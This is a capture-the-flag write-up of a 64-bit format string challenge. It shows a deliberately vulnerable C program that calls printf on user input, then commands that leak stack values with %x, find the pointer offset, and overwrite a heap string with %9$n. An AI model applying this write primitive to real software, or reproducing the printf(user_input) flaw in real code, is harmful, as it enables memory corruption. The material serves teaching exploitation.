To start off, the source code differs for this challenge differs from f6. This is because in order to perform the same exploit, you would need to input null bytes ("\x00") to get the proper formatting, however since argv uses null bytes to seperate items I wasn't able to input null bytes (I would encourage you to compile the code from f6 as 64 bit, and try to pwn it). So for this I came up with new source code.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char **argv)
{
	char *target;
	target = malloc(sizeof(char));
	strncpy(target, "Wait this isn't a lie?", 22);
	printf(argv[1]);
    puts("Now that your celebration has come, how do you feel?");
	printf("%p\n", target);
	printf("%s\n", target);

	if (strncmp(target, "Wait this isn't a lie?", 22) != 0)
	{
		puts("I bet you fell cheated, don't you? Level Cleared!\n");
	}
}
```

So as we can see here, we will just need to change the string pointed to by target. Fortunately for us the address that we need to write to it is stored on the stack, and even printed. Let's find it.

```
$	./f6_64 %x.%x.%x.%x.%x.%x.%x.%x.%x.%x
602020.73692073.74696157.602000.d.ffffdf38.400510.ffffdf30.602010.4006c0Now that your celebration has come, how do you feel?
0x602010
Wait this isn't a lie?
```

So we can see all of the QWORDS that are within an offset of 10. We see that the address the binary printed out for us is 0x602010, which we can see has an offset of 9. Let's verify that.  

```
$	./f6_64 %9\$x
602010Now that your celebration has come, how do you feel?
0x602010
Wait this isn't a lie?
```

As you can see with that, we have the right offset. Also the reason why I put the backslash befor the "$" character is we needed to escape that since it is a special character, otherwise it wouldn't be interpreted as a character. Now that we have the correct offset, let's write to it.

```
$	./f6_64 %9\$n
Now that your celebration has come, how do you feel?
0x602010

I bet you fell cheated, don't you? Level Cleared!

```

As you can see, we were able to successfully write to it. What we wrote to it didn't matter as long as it changed the value of the first 22 characters, which it did. And just like that we pwned the binary!